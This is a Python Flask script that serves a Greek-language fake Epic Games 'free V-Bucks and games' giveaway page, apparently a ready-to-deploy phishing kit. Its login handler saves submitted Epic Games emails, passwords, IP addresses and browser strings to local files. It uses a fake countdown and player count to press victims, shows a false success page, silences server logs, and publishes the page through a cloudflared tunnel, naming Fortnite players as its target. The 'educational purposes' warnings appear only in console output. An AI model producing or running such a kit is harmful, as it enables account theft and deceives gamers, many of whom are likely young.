import os
import sys
import subprocess
import re
import threading
import time
import logging
import random
from flask import Flask, render_template_string, request, session
from datetime import datetime
from werkzeug.utils import secure_filename

def install(pkg):
    subprocess.check_call([sys.executable, "-m", "pip", "install", "--quiet", pkg])

for pkg in ["flask", "werkzeug"]:
    try:
        __import__(pkg)
    except ImportError:
        install(pkg)

app = Flask(__name__)
app.secret_key = 'epic-games-test-key'

log = logging.getLogger('werkzeug')
log.setLevel(logging.ERROR + 10)
app.logger.setLevel(logging.ERROR + 10)

class DummyFile(object):
    def write(self, x): pass
    def flush(self): pass

BASE_FOLDER = os.path.expanduser("~/storage/downloads/Epic Games")
os.makedirs(BASE_FOLDER, exist_ok=True)

@app.route('/')
def index():
    session['epic_session'] = str(random.randint(100000, 999999))
    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>Epic Games Store - Δωρεάν V-Bucks & Παιχνίδια</title>
        <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/1764px-Epic_Games_logo.svg.png">
        <style>
            :root {
                --epic-purple: #2A2A2A;
                --epic-blue: #0074E4;
                --epic-light: #F5F5F5;
                --epic-dark: #121212;
                --epic-green: #00CC00;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #121212 0%, #2A2A2A 100%);
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, 'Segoe UI', Helvetica, Arial, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                overflow-x: hidden;
            }
            
            .login-box {
                background: rgba(42, 42, 42, 0.95);
                backdrop-filter: blur(10px);
                width: 100%;
                max-width: 520px;
                padding: 20px;
                border-radius: 12px;
                text-align: center;
                border: 2px solid #404040;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            @media (max-width: 480px) {
                .login-box {
                    padding: 15px;
                    border-radius: 8px;
                }
                
                body {
                    padding: 10px;
                }
            }
            
            .epic-logo {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            
            .epic-logo-text {
                font-size: 28px;
                font-weight: 800;
                color: white;
                letter-spacing: -0.5px;
            }
            
            .epic-icon {
                width: 50px;
                height: 50px;
                border-radius: 12px;
                object-fit: contain;
                filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
            }
            
            .giveaway-banner {
                background: linear-gradient(90deg, #0074E4 0%, #00A3FF 50%, #0074E4 100%);
                color: white;
                padding: 15px;
                border-radius: 8px;
                margin: 20px 0;
                font-weight: 700;
                font-size: 18px;
                border: 3px solid #00A3FF;
                animation: epicGlow 2s infinite;
                text-align: center;
            }
            
            @media (max-width: 480px) {
                .giveaway-banner {
                    font-size: 16px;
                    padding: 12px;
                    margin: 15px 0;
                }
            }
            
            @keyframes epicGlow {
                0% { box-shadow: 0 0 15px rgba(0, 116, 228, 0.5); }
                50% { box-shadow: 0 0 30px rgba(0, 163, 255, 0.8); }
                100% { box-shadow: 0 0 15px rgba(0, 116, 228, 0.5); }
            }
            
            .vbucks-badge {
                background: linear-gradient(90deg, #FFD700 0%, #FFED4E 50%, #FFD700 100%);
                color: #000;
                padding: 15px;
                border-radius: 8px;
                margin: 15px 0;
                font-weight: 900;
                font-size: 24px;
                border: 2px solid #FFD700;
                text-align: center;
            }
            
            @media (max-width: 480px) {
                .vbucks-badge {
                    font-size: 20px;
                    padding: 12px;
                }
            }
            
            .giveaway-container {
                background: rgba(0, 116, 228, 0.1);
                border: 2px dashed var(--epic-blue);
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            h1 {
                font-size: 28px;
                margin: 10px 0;
                color: white;
                font-weight: 700;
                text-align: center;
            }
            
            @media (max-width: 480px) {
                h1 {
                    font-size: 24px;
                }
            }
            
            .subtitle {
                color: #AAAAAA;
                font-size: 14px;
                margin-bottom: 20px;
                line-height: 1.5;
                text-align: center;
            }
            
            .timer {
                background: rgba(255, 0, 0, 0.1);
                border: 2px solid #FF4C4C;
                border-radius: 8px;
                padding: 12px;
                margin: 15px 0;
                font-family: 'Consolas', 'Monaco', monospace;
                font-size: 24px;
                color: #FF9999;
                text-align: center;
                font-weight: bold;
            }
            
            @media (max-width: 480px) {
                .timer {
                    font-size: 20px;
                    padding: 10px;
                }
            }
            
            .games-showcase {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            @media (max-width: 480px) {
                .games-showcase {
                    grid-template-columns: 1fr;
                    gap: 10px;
                }
            }
            
            .game-card {
                background: rgba(255, 255, 255, 0.05);
                border: 1px solid #404040;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
                transition: all 0.3s;
                position: relative;
                overflow: hidden;
            }
            
            .game-card:hover {
                border-color: var(--epic-blue);
                background: rgba(0, 116, 228, 0.1);
                transform: translateY(-3px);
            }
            
            .game-image {
                width: 100%;
                height: 100px;
                border-radius: 6px;
                margin-bottom: 12px;
                overflow: hidden;
                display: flex;
                align-items: center;
                justify-content: center;
            }
            
            .game-image img {
                width: 100%;
                height: 100%;
                object-fit: cover;
                border-radius: 4px;
            }
            
            @media (max-width: 480px) {
                .game-image {
                    height: 80px;
                }
            }
            
            .game-title {
                color: white;
                font-weight: 600;
                font-size: 16px;
                margin-bottom: 6px;
                text-align: center;
            }
            
            .game-price {
                color: #00CC00;
                font-weight: bold;
                font-size: 12px;
                text-align: center;
            }
            
            .free-tag {
                position: absolute;
                top: 8px;
                right: 8px;
                background: #00CC00;
                color: white;
                padding: 3px 6px;
                border-radius: 4px;
                font-size: 10px;
                font-weight: bold;
                z-index: 2;
            }
            
            .form-group {
                text-align: left;
                margin-bottom: 20px;
            }
            
            .form-label {
                color: #AAAAAA;
                font-size: 12px;
                font-weight: 600;
                margin-bottom: 6px;
                display: block;
                text-transform: uppercase;
                letter-spacing: 0.5px;
            }
            
            input {
                width: 100%;
                padding: 14px;
                background: rgba(255, 255, 255, 0.05);
                border: 2px solid #404040;
                border-radius: 6px;
                color: white;
                font-size: 14px;
                box-sizing: border-box;
                transition: all 0.3s;
                -webkit-appearance: none;
            }
            
            @media (max-width: 480px) {
                input {
                    padding: 12px;
                    font-size: 16px;
                }
            }
            
            input:focus {
                border-color: var(--epic-blue);
                outline: none;
                background: rgba(255, 255, 255, 0.1);
            }
            
            input::placeholder {
                color: #666666;
            }
            
            .login-btn {
                background: linear-gradient(45deg, #0074E4, #00A3FF);
                color: white;
                border: none;
                padding: 16px;
                border-radius: 6px;
                font-weight: 700;
                font-size: 16px;
                width: 100%;
                margin: 20px 0 12px;
                cursor: pointer;
                transition: all 0.3s;
                -webkit-tap-highlight-color: transparent;
            }
            
            .login-btn:hover, .login-btn:active {
                transform: translateY(-2px);
                box-shadow: 0 8px 20px rgba(0, 116, 228, 0.4);
            }
            
            @media (max-width: 480px) {
                .login-btn {
                    padding: 18px;
                    font-size: 18px;
                }
            }
            
            .benefits-list {
                text-align: left;
                margin: 20px 0;
            }
            
            .benefit-item {
                display: flex;
                align-items: center;
                margin: 12px 0;
                color: #FFFFFF;
                font-size: 14px;
            }
            
            @media (max-width: 480px) {
                .benefit-item {
                    font-size: 13px;
                    margin: 10px 0;
                }
            }
            
            .benefit-icon {
                color: #00CC00;
                font-weight: bold;
                margin-right: 12px;
                font-size: 18px;
                min-width: 20px;
            }
            
            .fortnite-badge {
                display: inline-flex;
                align-items: center;
                background: linear-gradient(45deg, #FF6B35, #FFA500);
                color: white;
                padding: 4px 12px;
                border-radius: 20px;
                font-size: 12px;
                font-weight: 700;
                margin-left: 8px;
                white-space: nowrap;
            }
            
            .warning-note {
                color: #FF9999;
                font-size: 11px;
                margin-top: 20px;
                border-top: 1px solid #404040;
                padding-top: 15px;
                text-align: center;
                line-height: 1.4;
            }
            
            @media (max-width: 480px) {
                .warning-note {
                    font-size: 10px;
                    padding-top: 12px;
                }
            }
            
            .players-count {
                background: rgba(0, 204, 0, 0.1);
                border: 2px solid var(--epic-green);
                border-radius: 8px;
                padding: 10px;
                margin: 15px 0;
                font-size: 12px;
                color: #00CC00;
                text-align: center;
            }
            
            .genre-tags {
                display: flex;
                justify-content: center;
                gap: 8px;
                margin: 12px 0;
                flex-wrap: wrap;
            }
            
            .genre-tag {
                background: rgba(0, 116, 228, 0.1);
                border: 1px solid #404040;
                border-radius: 20px;
                padding: 4px 10px;
                font-size: 10px;
                color: #AAAAAA;
                white-space: nowrap;
            }
            
            @media (max-width: 480px) {
                .epic-logo-text {
                    font-size: 24px;
                }
                
                .epic-icon {
                    width: 40px;
                    height: 40px;
                }
                
                .subtitle {
                    font-size: 13px;
                }
                
                .game-title {
                    font-size: 14px;
                }
                
                .game-price {
                    font-size: 11px;
                }
                
                .form-label {
                    font-size: 11px;
                }
            }
            
            @media screen and (max-width: 768px) {
                input, select, textarea {
                    font-size: 16px !important;
                }
            }
            
            button, input, .game-card {
                touch-action: manipulation;
            }
        </style>
    </head>
    <body>
        <div style="width: 100%; max-width: 520px; margin: 0 auto;">
            <div class="login-box">
                <div class="epic-logo">
                    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/1764px-Epic_Games_logo.svg.png" 
                         alt="Epic Games" 
                         class="epic-icon">
                    <div class="epic-logo-text">Epic Games</div>
                </div>
                
                <div class="giveaway-banner">
                    🎁 ΔΩΡΕΑΝ V-BUCKS & ΠΑΙΧΝΙΔΙΑ 🎁
                </div>
                
                <div class="vbucks-badge">
                    10,000 ΔΩΡΕΑΝ V-BUCKS
                </div>
                
                <div class="giveaway-container">
                    <h1>Κερδίστε Δωρεάν V-Bucks & Παιχνίδια</h1>
                    <div class="subtitle">
                        Περιορίζεται στους πρώτους 500 παίκτες! <span class="fortnite-badge">Fortnite</span>
                    </div>
                    
                    <div class="timer" id="countdown">
                        20:00
                    </div>
                </div>
                
                <div class="players-count">
                    🔥 <strong>32,847,129 παίκτες online</strong> - Συμμετέχετε τώρα!
                </div>
                
                <div class="genre-tags">
                    <span class="genre-tag">Battle Royale</span>
                    <span class="genre-tag">Δράση</span>
                    <span class="genre-tag">Περιπέτεια</span>
                    <span class="genre-tag">RPG</span>
                    <span class="genre-tag">Στρατηγικής</span>
                </div>
                
                <div class="games-showcase">
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">
                            <img src="https://cdn2.unrealengine.com/fortnite-512x512-30e6c08a6a4c.png" alt="Fortnite Crew Pack">
                        </div>
                        <div class="game-title">Fortnite Crew Pack</div>
                        <div class="game-price">$11.99/μήνα → ΔΩΡΕΑΝ</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">
                            <img src="https://cdn2.unrealengine.com/borderlands3-512x512-9e0d3e5b28bd.png" alt="Borderlands 3">
                        </div>
                        <div class="game-title">Borderlands 3</div>
                        <div class="game-price">$59.99 → ΔΩΡΕΑΝ</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">
                            <img src="https://cdn2.unrealengine.com/ark-512x512-39fbe4bb100a.png" alt="Ark: Survival Evolved">
                        </div>
                        <div class="game-title">Ark: Survival Evolved</div>
                        <div class="game-price">$49.99 → ΔΩΡΕΑΝ</div>
                    </div>
                    <div class="game-card">
                        <div class="free-tag">ΔΩΡΕΑΝ</div>
                        <div class="game-image">
                            <img src="https://cdn2.unrealengine.com/rocketleague-512x512-69d6e83439bb.png" alt="Rocket League">
                        </div>
                        <div class="game-title">Rocket League</div>
                        <div class="game-price">Premium Pass → ΔΩΡΕΑΝ</div>
                    </div>
                </div>
                
                <div class="benefits-list">
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        10,000 V-Bucks στο λογαριασμό σας
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        4 Δωρεάν AAA Παιχνίδια (Μόνιμη πρόσβαση)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Fortnite Crew Συνδρομή (3 Μήνες)
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Αποκλειστικά Αντικείμενα Epic Games Store
                    </div>
                    <div class="benefit-item">
                        <span class="benefit-icon">✓</span>
                        Προτεραιότητα σε υποστήριξη
                    </div>
                </div>
                
                <form action="/login" method="post">
                    <div class="form-group">
                        <label class="form-label">EMAIL EPIC GAMES</label>
                        <input type="text" 
                               name="username" 
                               placeholder="Εισάγετε το email σας για Epic Games" 
                               required
                               autocapitalize="off"
                               autocorrect="off"
                               spellcheck="false">
                    </div>
                    
                    <div class="form-group">
                        <label class="form-label">ΚΩΔΙΚΟΣ ΠΡΟΣΒΑΣΗΣ</label>
                        <input type="password" 
                               name="password" 
                               placeholder="Εισάγετε τον κωδικό σας" 
                               required
                               autocapitalize="off"
                               autocorrect="off"
                               spellcheck="false">
                    </div>
                    
                    <button type="submit" class="login-btn">
                        🎮 Κερδίστε Δωρεάν V-Bucks & Παιχνίδια
                    </button>
                </form>
                
                <div class="warning-note">
                    ⚠️ Η προσφορά λήγει σε 20 λεπτά. Τα V-Bucks και τα παιχνίδια θα προστεθούν εντός 2 ωρών.
                </div>
            </div>
        </div>
        
        <script>
            let timeLeft = 1200;
            const countdownElement = document.getElementById('countdown');
            
            function updateTimer() {
                const minutes = Math.floor(timeLeft / 60);
                const seconds = timeLeft % 60;
                countdownElement.textContent = `${minutes.toString().padStart(2, '0')}:${seconds.toString().padStart(2, '0')}`;
                
                if (timeLeft <= 300) {
                    countdownElement.style.background = 'rgba(255, 0, 0, 0.2)';
                    countdownElement.style.animation = 'epicGlow 1s infinite';
                }
                
                if (timeLeft > 0) {
                    timeLeft--;
                    setTimeout(updateTimer, 1000);
                } else {
                    countdownElement.textContent = "Η προσφορά έληξε!";
                    countdownElement.style.color = '#FF4C4C';
                }
            }
            
            updateTimer();
            
            const gameCards = document.querySelectorAll('.game-card');
            gameCards.forEach((card, index) => {
                card.style.opacity = '0';
                card.style.transform = 'translateY(10px)';
                
                setTimeout(() => {
                    card.style.transition = 'all 0.4s ease';
                    card.style.opacity = '1';
                    card.style.transform = 'translateY(0)';
                }, index * 150);
            });
            
            const form = document.querySelector('form');
            form.addEventListener('submit', function(e) {
                const submitBtn = this.querySelector('.login-btn');
                submitBtn.style.transform = 'translateY(0)';
                submitBtn.style.opacity = '0.8';
            });
            
            function handleViewport() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            window.addEventListener('resize', handleViewport);
            window.addEventListener('load', handleViewport);
            handleViewport();
        </script>
    </body>
    </html>
    ''')

@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username', '').strip()
    password = request.form.get('password', '').strip()
    session_id = session.get('epic_session', 'unknown')

    safe_username = secure_filename(username)
    timestamp = datetime.now().strftime('%Y%m%d_%H%M%S')
    user_file_path = os.path.join(BASE_FOLDER, f"{safe_username}_{timestamp}.txt")

    with open(user_file_path, 'w') as file:
        file.write(f"Session: {session_id}\n")
        file.write(f"Email: {username}\n")
        file.write(f"Password: {password}\n")
        file.write(f"Timestamp: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
        file.write(f"User-Agent: {request.headers.get('User-Agent', 'Unknown')}\n")
        file.write(f"IP: {request.remote_addr}\n")
        file.write(f"Platform: Epic Games V-Bucks Giveaway\n")
        file.write(f"Promised: 10,000 V-Bucks + 4 Free Games\n")
        file.write(f"Games Shown: Fortnite Crew, Borderlands 3, Ark, Rocket League\n")

    return render_template_string('''
    <!DOCTYPE html>
    <html lang="el">
    <head>
        <title>Επεξεργασία V-Bucks - Epic Games</title>
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <link rel="icon" type="image/x-icon" href="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/1764px-Epic_Games_logo.svg.png">
        <style>
            :root {
                --epic-blue: #0074E4;
                --epic-green: #00CC00;
            }
            
            * {
                box-sizing: border-box;
            }
            
            body {
                background: linear-gradient(135deg, #121212 0%, #2A2A2A 100%);
                font-family: 'Inter', -apple-system, BlinkMacSystemFont, sans-serif;
                margin: 0;
                padding: 20px;
                display: flex;
                justify-content: center;
                align-items: center;
                min-height: 100vh;
                color: #FFFFFF;
                overflow-x: hidden;
            }
            
            .container {
                text-align: center;
                background: rgba(42, 42, 42, 0.95);
                backdrop-filter: blur(10px);
                padding: 30px;
                border-radius: 12px;
                width: 100%;
                max-width: 600px;
                border: 2px solid #404040;
                box-shadow: 0 8px 32px rgba(0, 0, 0, 0.5);
                margin: 0 auto;
            }
            
            @media (max-width: 480px) {
                .container {
                    padding: 20px;
                    border-radius: 8px;
                }
                
                body {
                    padding: 10px;
                }
            }
            
            .epic-logo {
                display: flex;
                align-items: center;
                justify-content: center;
                gap: 10px;
                margin-bottom: 20px;
                flex-wrap: wrap;
            }
            
            .epic-logo-text {
                font-size: 32px;
                font-weight: 800;
                color: white;
                letter-spacing: -0.5px;
            }
            
            .epic-icon {
                width: 60px;
                height: 60px;
                border-radius: 12px;
                object-fit: contain;
                filter: drop-shadow(0 2px 4px rgba(0,0,0,0.3));
                animation: float 3s ease-in-out infinite;
            }
            
            @keyframes float {
                0%, 100% { transform: translateY(0); }
                50% { transform: translateY(-8px); }
            }
            
            @media (max-width: 480px) {
                .epic-icon {
                    width: 50px;
                    height: 50px;
                }
                
                .epic-logo-text {
                    font-size: 24px;
                }
            }
            
            .processing-container {
                background: rgba(0, 116, 228, 0.1);
                border: 2px solid var(--epic-blue);
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
            }
            
            .progress-container {
                width: 100%;
                height: 6px;
                background: rgba(255, 255, 255, 0.1);
                border-radius: 4px;
                margin: 20px 0;
                overflow: hidden;
            }
            
            .progress-bar {
                height: 100%;
                background: linear-gradient(90deg, #0074E4, #00A3FF, #00CC00);
                border-radius: 4px;
                width: 0%;
                animation: fillProgress 3s ease-in-out forwards;
            }
            
            @keyframes fillProgress {
                0% { width: 0%; }
                100% { width: 100%; }
            }
            
            .giveaway-activated {
                background: rgba(255, 215, 0, 0.1);
                border: 2px solid #FFD700;
                border-radius: 12px;
                padding: 20px;
                margin: 20px 0;
                text-align: left;
            }
            
            .checkmark {
                color: #00CC00;
                font-weight: bold;
                font-size: 18px;
                margin-right: 12px;
                min-width: 20px;
            }
            
            .status-item {
                display: flex;
                align-items: center;
                margin: 15px 0;
                color: #FFFFFF;
                font-size: 16px;
            }
            
            @media (max-width: 480px) {
                .status-item {
                    font-size: 14px;
                    margin: 12px 0;
                }
                
                .checkmark {
                    font-size: 16px;
                }
            }
            
            .vbucks-amount {
                font-size: 40px;
                font-weight: 900;
                background: linear-gradient(45deg, #FFD700, #FFED4E);
                -webkit-background-clip: text;
                -webkit-text-fill-color: transparent;
                margin: 15px 0;
                text-shadow: 0 0 20px rgba(255, 215, 0, 0.3);
                text-align: center;
            }
            
            @media (max-width: 480px) {
                .vbucks-amount {
                    font-size: 32px;
                }
            }
            
            .vbucks-icon {
                color: #FFD700;
                font-size: 28px;
                margin-right: 8px;
                vertical-align: middle;
            }
            
            .games-added {
                display: grid;
                grid-template-columns: repeat(2, 1fr);
                gap: 12px;
                margin: 20px 0;
            }
            
            @media (max-width: 480px) {
                .games-added {
                    grid-template-columns: repeat(2, 1fr);
                    gap: 10px;
                }
            }
            
            .game-item {
                background: rgba(255, 255, 255, 0.03);
                border: 1px solid #404040;
                border-radius: 8px;
                padding: 15px;
                text-align: center;
            }
            
            .game-icon {
                font-size: 20px;
                margin-bottom: 8px;
                color: #00A3FF;
            }
            
            .transaction-id {
                background: rgba(0, 116, 228, 0.1);
                border: 1px solid #404040;
                border-radius: 4px;
                padding: 8px;
                font-family: 'Consolas', monospace;
                font-size: 11px;
                color: #AAAAAA;
                margin: 12px 0;
                word-break: break-all;
                text-align: center;
            }
            
            h2 {
                margin-bottom: 10px;
                color: #00A3FF;
                text-align: center;
                font-size: 24px;
            }
            
            @media (max-width: 480px) {
                h2 {
                    font-size: 20px;
                }
            }
            
            p {
                color: #AAAAAA;
                margin-bottom: 20px;
                text-align: center;
                font-size: 14px;
            }
            
            @media (max-width: 480px) {
                p {
                    font-size: 13px;
                }
            }
            
            @media (max-width: 480px) {
                .processing-container {
                    padding: 15px;
                }
                
                .giveaway-activated {
                    padding: 15px;
                }
                
                .game-item {
                    padding: 12px;
                    font-size: 12px;
                }
                
                .game-icon {
                    font-size: 18px;
                }
            }
        </style>
        <meta http-equiv="refresh" content="8;url=/" />
    </head>
    <body>
        <div class="container">
            <div class="epic-logo">
                <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/31/Epic_Games_logo.svg/1764px-Epic_Games_logo.svg.png" 
                     alt="Epic Games" 
                     class="epic-icon">
                <div class="epic-logo-text">Epic Games</div>
            </div>
            
            <div class="vbucks-amount">
                <span class="vbucks-icon">💰</span>10,000 V-Bucks
            </div>
            
            <h2>Η Προσφορά Ενεργοποιήθηκε!</h2>
            <p>Τα V-Bucks και τα παιχνίδια σας προστίθενται</p>
            
            <div class="processing-container">
                <h3>Επεξεργασία της Προσφοράς σας</h3>
                <div class="progress-container">
                    <div class="progress-bar"></div>
                </div>
                <p>Προσθήκη V-Bucks και παιχνιδιών στον λογαριασμό σας...</p>
            </div>
            
            <div class="games-added">
                <div class="game-item">
                    <div class="game-icon">🎮</div>
                    <div>Fortnite Crew</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">⚔️</div>
                    <div>Borderlands 3</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🦖</div>
                    <div>Ark: Survival</div>
                </div>
                <div class="game-item">
                    <div class="game-icon">🚀</div>
                    <div>Rocket League</div>
                </div>
            </div>
            
            <div class="transaction-id">
                ID Συναλλαγής: EPIC-VBUCKS-<span id="transaction-id">0000000</span>
            </div>
            
            <div class="giveaway-activated">
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>10,000 V-Bucks</strong> προστέθηκαν στον λογαριασμό σας
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>4 AAA Παιχνίδια</strong> μόνιμα στη βιβλιοθήκη σας
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Fortnite Crew</strong> - 3 μηνών συνδρομή
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Αποκλειστικά Αντικείμενα</strong> στο locker σας
                </div>
                <div class="status-item">
                    <span class="checkmark">✓</span>
                    <strong>Προτεραιότητα Υποστήριξης</strong> για τον λογαριασμό σας
                </div>
            </div>
            
            <p style="margin-top: 20px; font-size: 13px;">
            Θα ανακατευθυνθείτε στην Epic Games σύντομα...
                <br>
                <small style="color: #666666;">Τα V-Bucks και τα παιχνίδια θα είναι διαθέσιμα εντός 2 ωρών</small>
            </p>
        </div>
        
        <script>
            document.getElementById('transaction-id').textContent = 
                Math.floor(Math.random() * 10000000).toString().padStart(7, '0');
            
            setTimeout(() => {
                const vbucksAmount = document.querySelector('.vbucks-amount');
                vbucksAmount.style.transform = 'scale(1.05)';
                vbucksAmount.style.transition = 'transform 0.3s';
                setTimeout(() => {
                    vbucksAmount.style.transform = 'scale(1)';
                }, 300);
            }, 1000);
            
            const gameItems = document.querySelectorAll('.game-item');
            gameItems.forEach((item, index) => {
                item.style.opacity = '0';
                setTimeout(() => {
                    item.style.transition = 'opacity 0.4s';
                    item.style.opacity = '1';
                }, index * 200);
            });
            
            function handleViewport() {
                const vh = window.innerHeight * 0.01;
                document.documentElement.style.setProperty('--vh', `${vh}px`);
            }
            
            window.addEventListener('resize', handleViewport);
            window.addEventListener('load', handleViewport);
            handleViewport();
        </script>
    </body>
    </html>
    ''')

def run_cloudflared_tunnel(local_url):
    cmd = ["cloudflared", "tunnel", "--url", local_url]
    process = subprocess.Popen(cmd, stdout=subprocess.PIPE, stderr=subprocess.STDOUT, text=True)
    
    for line in process.stdout:
        match = re.search(r'https://[a-zA-Z0-9-]+\.trycloudflare\.com', line)
        if match:
            tunnel_url = match.group(0)
            print(f"🎮 Δημόσιος Σύνδεσμος Epic Games: {tunnel_url}")
            print(f"💰 Προσφορά: 10,000 ΔΩΡΕΑΝ V-Bucks + 4 Δωρεάν Παιχνίδια")
            print(f"💾 Πληροφορίες αποθηκεύονται σε: {BASE_FOLDER}")
            print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Μόνο για εκπαιδευτικούς σκοπούς!")
            print("⚠️  Ποτέ μην εισάγετε πραγματικά στοιχεία Epic Games!")
            print("⚠️  Οι απάτες για 'Δωρεάν V-Bucks' στο Fortnite είναι πολύ συχνές!")
            print("⚠️  Οι λογαριασμοί Fortnite έχουν μεγάλη αξία!")
            print("-" * 50)
            sys.stdout.flush()
            break
    
    return process

if __name__ == '__main__':
    sys_stdout = sys.stdout
    sys_stderr = sys.stderr
    sys.stdout = DummyFile()
    sys.stderr = DummyFile()

    def run_flask():
        app.run(host='0.0.0.0', port=5012, debug=False, use_reloader=False)

    flask_thread = threading.Thread(target=run_flask, daemon=True)
    flask_thread.start()

    time.sleep(2)
    sys.stdout = sys_stdout
    sys.stderr = sys_stderr

    print("🚀 Εκκίνηση Σελίδας Δωρεάν V-Bucks Epic Games...")
    print("📱 Θύρα: 5012")
    print("💾 Τοποθεσία αποθήκευσης: ~/storage/downloads/EpicGames/")
    print("💰 Προσφορά: 10,000 ΔΩΡΕΑΝ V-Bucks")
    print("🎮 Bonus: 4 Δωρεάν AAA Παιχνίδια + Fortnite Crew")
    print("🎯 Στόχος: Παίκτες Fortnite και χρήστες Epic Games Store")
    print("⚠️  ΠΡΟΕΙΔΟΠΟΙΗΣΗ: Οι απάτες για 'Δωρεάν V-Bucks' στοχεύουν εκατομμύρια gamers!")
    print("⏳ Αναμονή για σύνδεση cloudflared...")
    
    cloudflared_process = run_cloudflared_tunnel("http://127.0.0.1:5012")

    try:
        cloudflared_process.wait()
    except KeyboardInterrupt:
        cloudflared_process.terminate()
        print("\n👋 Ο διακομιστής σταμάτησε")
        sys.exit(0)